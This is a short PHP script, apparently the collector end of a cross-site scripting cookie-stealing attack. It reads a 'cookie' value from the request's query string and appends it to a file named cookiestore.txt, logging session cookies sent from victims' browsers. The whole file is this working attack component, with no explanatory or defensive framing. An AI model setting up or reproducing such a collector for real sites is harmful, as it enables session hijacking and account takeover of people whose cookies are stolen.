<?php
$cook = $_GET['cookie'];



$myfile = fopen("cookiestore.txt", "a");
$txt = $cook . "\n";
fwrite($myfile, $txt);
fclose($myfile);
